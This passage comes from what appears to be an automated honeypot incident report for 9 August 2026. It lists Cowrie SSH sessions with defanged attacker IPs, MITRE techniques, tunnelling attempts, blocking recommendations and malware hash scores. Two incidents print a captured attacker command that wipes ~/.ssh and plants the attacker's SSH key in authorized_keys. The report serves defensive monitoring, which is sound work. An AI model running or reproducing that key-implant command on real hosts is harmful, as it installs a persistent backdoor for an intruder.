| `2026-08-09 03:18:28` | `cowrie.direct-tcpip.request` |
| `2026-08-09 03:18:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.126[.]10` to AbuseIPDB if not already reported
- [ ] Block `196.189.126[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32890ea99149

| Field | Detail |
|---|---|
| **Source IP** | `68.183.113[.]3` |
| **First Seen** | 2026-08-09 03:20 |
| **Last Seen** | 2026-08-09 03:20 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 03:20:45` | `cowrie.session.connect` |
| `2026-08-09 03:20:45` | `cowrie.client.version` |
| `2026-08-09 03:20:45` | `cowrie.client.kex` |
| `2026-08-09 03:20:45` | `cowrie.login.success` |
| `2026-08-09 03:20:45` | `cowrie.session.params` |
| `2026-08-09 03:20:46` | `cowrie.command.input` |
| `2026-08-09 03:20:46` | `cowrie.command.failed` |
| `2026-08-09 03:20:46` | `cowrie.log.closed` |
| `2026-08-09 03:20:46` | `cowrie.session.params` |
| `2026-08-09 03:20:46` | `cowrie.command.input` |
| `2026-08-09 03:20:46` | `cowrie.session.file_download` |
| `2026-08-09 03:20:46` | `cowrie.log.closed` |
| `2026-08-09 03:20:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.183.113[.]3` to AbuseIPDB if not already reported
- [ ] Block `68.183.113[.]3` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6a5889a5391

| Field | Detail |
|---|---|
| **Source IP** | `68.183.113[.]3` |
| **First Seen** | 2026-08-09 03:20 |
| **Last Seen** | 2026-08-09 03:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 03:20:48` | `cowrie.session.connect` |
| `2026-08-09 03:20:48` | `cowrie.client.version` |
| `2026-08-09 03:20:48` | `cowrie.client.kex` |
| `2026-08-09 03:20:48` | `cowrie.login.success` |
| `2026-08-09 03:20:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.183.113[.]3` to AbuseIPDB if not already reported
- [ ] Block `68.183.113[.]3` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6339d6691df

| Field | Detail |
|---|---|
| **Source IP** | `68.183.113[.]3` |
| **First Seen** | 2026-08-09 03:20 |
| **Last Seen** | 2026-08-09 03:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 03:20:48` | `cowrie.session.connect` |
| `2026-08-09 03:20:48` | `cowrie.client.version` |
| `2026-08-09 03:20:48` | `cowrie.client.kex` |
| `2026-08-09 03:20:48` | `cowrie.login.success` |
| `2026-08-09 03:20:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.183.113[.]3` to AbuseIPDB if not already reported
- [ ] Block `68.183.113[.]3` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b26d35d1ff59

| Field | Detail |
|---|---|
| **Source IP** | `40.83.182[.]122` |
| **First Seen** | 2026-08-09 03:23 |
| **Last Seen** | 2026-08-09 03:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 03:23:34` | `cowrie.session.connect` |
| `2026-08-09 03:23:34` | `cowrie.client.version` |
| `2026-08-09 03:23:34` | `cowrie.client.kex` |
| `2026-08-09 03:23:35` | `cowrie.login.success` |
| `2026-08-09 03:23:35` | `cowrie.session.params` |
| `2026-08-09 03:23:35` | `cowrie.command.input` |
| `2026-08-09 03:23:35` | `cowrie.command.failed` |
| `2026-08-09 03:23:36` | `cowrie.log.closed` |
| `2026-08-09 03:23:36` | `cowrie.session.params` |
| `2026-08-09 03:23:36` | `cowrie.command.input` |
| `2026-08-09 03:23:36` | `cowrie.session.file_download` |
| `2026-08-09 03:23:36` | `cowrie.log.closed` |
| `2026-08-09 03:23:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.83.182[.]122` to AbuseIPDB if not already reported
- [ ] Block `40.83.182[.]122` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5da9b34fddf

| Field | Detail |
|---|---|
| **Source IP** | `40.83.182[.]122` |
| **First Seen** | 2026-08-09 03:23 |
| **Last Seen** | 2026-08-09 03:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 03:23:36` | `cowrie.session.connect` |
| `2026-08-09 03:23:36` | `cowrie.client.version` |
| `2026-08-09 03:23:36` | `cowrie.client.kex` |
| `2026-08-09 03:23:37` | `cowrie.login.success` |
| `2026-08-09 03:23:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.83.182[.]122` to AbuseIPDB if not already reported
- [ ] Block `40.83.182[.]122` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c5517db29c1

| Field | Detail |
|---|---|
| **Source IP** | `40.83.182[.]122` |
| **First Seen** | 2026-08-09 03:23 |
| **Last Seen** | 2026-08-09 03:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 03:23:37` | `cowrie.session.connect` |
| `2026-08-09 03:23:37` | `cowrie.client.version` |
| `2026-08-09 03:23:37` | `cowrie.client.kex` |
| `2026-08-09 03:23:37` | `cowrie.login.success` |
| `2026-08-09 03:23:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.83.182[.]122` to AbuseIPDB if not already reported
- [ ] Block `40.83.182[.]122` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-572bdfd7c84b

| Field | Detail |
|---|---|
| **Source IP** | `116.72.9[.]151` |
| **First Seen** | 2026-08-09 03:34 |
| **Last Seen** | 2026-08-09 03:34 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 03:34:42` | `cowrie.session.connect` |
| `2026-08-09 03:34:43` | `cowrie.client.version` |
| `2026-08-09 03:34:43` | `cowrie.client.kex` |
| `2026-08-09 03:34:45` | `cowrie.login.success` |
| `2026-08-09 03:34:45` | `cowrie.direct-tcpip.request` |
| `2026-08-09 03:34:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.72.9[.]151` to AbuseIPDB if not already reported
- [ ] Block `116.72.9[.]151` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9767160bb23b

| Field | Detail |
|---|---|
| **Source IP** | `111.70.32[.]49` |
| **First Seen** | 2026-08-09 03:34 |
| **Last Seen** | 2026-08-09 03:35 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 03:34:55` | `cowrie.session.connect` |
| `2026-08-09 03:34:56` | `cowrie.client.version` |
| `2026-08-09 03:34:56` | `cowrie.client.kex` |
| `2026-08-09 03:34:58` | `cowrie.login.success` |
| `2026-08-09 03:34:58` | `cowrie.direct-tcpip.request` |
| `2026-08-09 03:35:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.32[.]49` to AbuseIPDB if not already reported
- [ ] Block `111.70.32[.]49` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d620bf7dd582

| Field | Detail |
|---|---|
| **Source IP** | `221.120.57[.]125` |
| **First Seen** | 2026-08-09 03:43 |
| **Last Seen** | 2026-08-09 03:43 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 03:43:40` | `cowrie.session.connect` |
| `2026-08-09 03:43:40` | `cowrie.client.version` |
| `2026-08-09 03:43:40` | `cowrie.client.kex` |
| `2026-08-09 03:43:42` | `cowrie.login.success` |
| `2026-08-09 03:43:43` | `cowrie.direct-tcpip.request` |
| `2026-08-09 03:43:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.120.57[.]125` to AbuseIPDB if not already reported
- [ ] Block `221.120.57[.]125` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-803cf674d148

| Field | Detail |
|---|---|
| **Source IP** | `182.75.197[.]174` |
| **First Seen** | 2026-08-09 03:43 |
| **Last Seen** | 2026-08-09 03:43 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 03:43:48` | `cowrie.session.connect` |
| `2026-08-09 03:43:49` | `cowrie.client.version` |
| `2026-08-09 03:43:49` | `cowrie.client.kex` |
| `2026-08-09 03:43:51` | `cowrie.login.success` |
| `2026-08-09 03:43:52` | `cowrie.direct-tcpip.request` |
| `2026-08-09 03:43:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.75.197[.]174` to AbuseIPDB if not already reported
- [ ] Block `182.75.197[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23b4d99073f3

| Field | Detail |
|---|---|
| **Source IP** | `65.20.138[.]3` |
| **First Seen** | 2026-08-09 03:45 |
| **Last Seen** | 2026-08-09 03:45 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 03:45:37` | `cowrie.session.connect` |
| `2026-08-09 03:45:38` | `cowrie.client.version` |
| `2026-08-09 03:45:38` | `cowrie.client.kex` |
| `2026-08-09 03:45:39` | `cowrie.login.success` |
| `2026-08-09 03:45:39` | `cowrie.direct-tcpip.request` |
| `2026-08-09 03:45:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.138[.]3` to AbuseIPDB if not already reported
- [ ] Block `65.20.138[.]3` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e422a4541ecb

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-09 04:04 |
| **Last Seen** | 2026-08-09 04:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 04:04:59` | `cowrie.session.connect` |
| `2026-08-09 04:04:59` | `cowrie.client.version` |
| `2026-08-09 04:04:59` | `cowrie.client.kex` |
| `2026-08-09 04:04:59` | `cowrie.login.success` |
| `2026-08-09 04:05:00` | `cowrie.direct-tcpip.request` |
| `2026-08-09 04:05:00` | `cowrie.direct-tcpip.data` |
| `2026-08-09 04:05:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9ea9191bec8

| Field | Detail |
|---|---|
| **Source IP** | `36.135.62[.]103` |
| **First Seen** | 2026-08-09 04:18 |
| **Last Seen** | 2026-08-09 04:18 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 04:18:05` | `cowrie.session.connect` |
| `2026-08-09 04:18:06` | `cowrie.client.version` |
| `2026-08-09 04:18:06` | `cowrie.client.kex` |
| `2026-08-09 04:18:08` | `cowrie.login.success` |
| `2026-08-09 04:18:09` | `cowrie.direct-tcpip.request` |
| `2026-08-09 04:18:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.135.62[.]103` to AbuseIPDB if not already reported
- [ ] Block `36.135.62[.]103` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99ccebf45e27

| Field | Detail |
|---|---|
| **Source IP** | `65.20.133[.]56` |
| **First Seen** | 2026-08-09 04:18 |
| **Last Seen** | 2026-08-09 04:18 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 04:18:14` | `cowrie.session.connect` |
| `2026-08-09 04:18:15` | `cowrie.client.version` |
| `2026-08-09 04:18:15` | `cowrie.client.kex` |
| `2026-08-09 04:18:16` | `cowrie.login.success` |
| `2026-08-09 04:18:16` | `cowrie.direct-tcpip.request` |
| `2026-08-09 04:18:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.133[.]56` to AbuseIPDB if not already reported
- [ ] Block `65.20.133[.]56` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c7a8ec1101a

| Field | Detail |
|---|---|
| **Source IP** | `223.85.251[.]61` |
| **First Seen** | 2026-08-09 04:19 |
| **Last Seen** | 2026-08-09 04:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 04:19:00` | `cowrie.session.connect` |
| `2026-08-09 04:19:04` | `cowrie.telnet.option` |
| `2026-08-09 04:19:05` | `cowrie.telnet.option` |
| `2026-08-09 04:20:07` | `cowrie.login.success` |
| `2026-08-09 04:20:07` | `cowrie.session.params` |

**Recommended Actions:**
- [ ] Submit `223.85.251[.]61` to AbuseIPDB if not already reported
- [ ] Block `223.85.251[.]61` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff530481cff8

| Field | Detail |
|---|---|
| **Source IP** | `103.68.22[.]115` |
| **First Seen** | 2026-08-09 04:27 |
| **Last Seen** | 2026-08-09 04:27 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 04:27:24` | `cowrie.session.connect` |
| `2026-08-09 04:27:25` | `cowrie.client.version` |
| `2026-08-09 04:27:25` | `cowrie.client.kex` |
| `2026-08-09 04:27:26` | `cowrie.login.success` |
| `2026-08-09 04:27:27` | `cowrie.direct-tcpip.request` |
| `2026-08-09 04:27:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.68.22[.]115` to AbuseIPDB if not already reported
- [ ] Block `103.68.22[.]115` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-774ecea40ffb

| Field | Detail |
|---|---|
| **Source IP** | `220.180.166[.]214` |
| **First Seen** | 2026-08-09 04:27 |
| **Last Seen** | 2026-08-09 04:32 |
| **Session Duration** | 303s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 04:27:34` | `cowrie.session.connect` |
| `2026-08-09 04:27:35` | `cowrie.client.version` |
| `2026-08-09 04:27:35` | `cowrie.client.kex` |
| `2026-08-09 04:27:37` | `cowrie.login.success` |
| `2026-08-09 04:32:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.180.166[.]214` to AbuseIPDB if not already reported
- [ ] Block `220.180.166[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83919c332e03

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-09 04:31 |
| **Last Seen** | 2026-08-09 04:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 04:31:45` | `cowrie.session.connect` |
| `2026-08-09 04:31:45` | `cowrie.client.version` |
| `2026-08-09 04:31:45` | `cowrie.client.kex` |
| `2026-08-09 04:31:46` | `cowrie.login.success` |
| `2026-08-09 04:31:46` | `cowrie.direct-tcpip.request` |
| `2026-08-09 04:31:46` | `cowrie.direct-tcpip.data` |
| `2026-08-09 04:31:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f186f3469530

| Field | Detail |
|---|---|
| **Source IP** | `93.177.157[.]179` |
| **First Seen** | 2026-08-09 04:43 |
| **Last Seen** | 2026-08-09 04:43 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 04:43:40` | `cowrie.session.connect` |
| `2026-08-09 04:43:40` | `cowrie.client.version` |
| `2026-08-09 04:43:40` | `cowrie.client.kex` |
| `2026-08-09 04:43:41` | `cowrie.login.success` |
| `2026-08-09 04:43:41` | `cowrie.direct-tcpip.request` |
| `2026-08-09 04:43:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.177.157[.]179` to AbuseIPDB if not already reported
- [ ] Block `93.177.157[.]179` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67f13a912cd8

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-09 04:49 |
| **Last Seen** | 2026-08-09 04:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 04:49:55` | `cowrie.session.connect` |
| `2026-08-09 04:49:55` | `cowrie.client.version` |
| `2026-08-09 04:49:55` | `cowrie.client.kex` |
| `2026-08-09 04:49:56` | `cowrie.login.success` |
| `2026-08-09 04:49:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6496bba766a9

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-09 04:49 |
| **Last Seen** | 2026-08-09 04:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 04:49:55` | `cowrie.session.connect` |
| `2026-08-09 04:49:55` | `cowrie.client.version` |
| `2026-08-09 04:49:55` | `cowrie.client.kex` |
| `2026-08-09 04:49:56` | `cowrie.login.success` |
| `2026-08-09 04:49:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfbb879d53d2

| Field | Detail |
|---|---|
| **Source IP** | `65.20.158[.]10` |
| **First Seen** | 2026-08-09 04:52 |
| **Last Seen** | 2026-08-09 04:52 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 04:52:17` | `cowrie.session.connect` |
| `2026-08-09 04:52:17` | `cowrie.client.version` |
| `2026-08-09 04:52:17` | `cowrie.client.kex` |
| `2026-08-09 04:52:19` | `cowrie.login.success` |
| `2026-08-09 04:52:19` | `cowrie.direct-tcpip.request` |
| `2026-08-09 04:52:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.158[.]10` to AbuseIPDB if not already reported
- [ ] Block `65.20.158[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `91.233.83[.]203` | **6** | 2026-08-09 03:11 | 2026-08-09 04:39 | 3m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **4** | 2026-08-09 03:18 | 2026-08-09 04:35 | 0m | 0 | `T1592` | 🟢 LOW |
| `164.92.115[.]22` | **3** | 2026-08-09 04:03 | 2026-08-09 04:04 | 1m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]162` | **3** | 2026-08-09 03:58 | 2026-08-09 03:58 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]165` | **3** | 2026-08-09 03:30 | 2026-08-09 03:30 | 0m | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]123` | **3** | 2026-08-09 04:52 | 2026-08-09 04:52 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.242.104[.]81` | 1 | 2026-08-09 03:18 | 2026-08-09 03:19 | 43s | 0 | `T1592` | 🟢 LOW |
| `106.246.89[.]70` | 1 | 2026-08-09 03:45 | 2026-08-09 03:46 | 15s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]238` | 1 | 2026-08-09 04:22 | 2026-08-09 04:22 | 0s | 0 | `T1592` | 🟢 LOW |
| `202.72.196[.]75` | 1 | 2026-08-09 03:09 | 2026-08-09 03:11 | 120s | 0 | `T1592` | 🟢 LOW |
| `37.57.235[.]253` | 1 | 2026-08-09 03:17 | 2026-08-09 03:17 | 0s | 0 | `T1592` | 🟢 LOW |
| `46.32.66[.]109` | 1 | 2026-08-09 03:27 | 2026-08-09 03:29 | 120s | 0 | `T1592` | 🟢 LOW |
| `60.223.251[.]132` | 1 | 2026-08-09 03:11 | 2026-08-09 03:11 | 47s | 0 | `T1592` | 🟢 LOW |
| `93.171.242[.]207` | 1 | 2026-08-09 04:28 | 2026-08-09 04:28 | 12s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
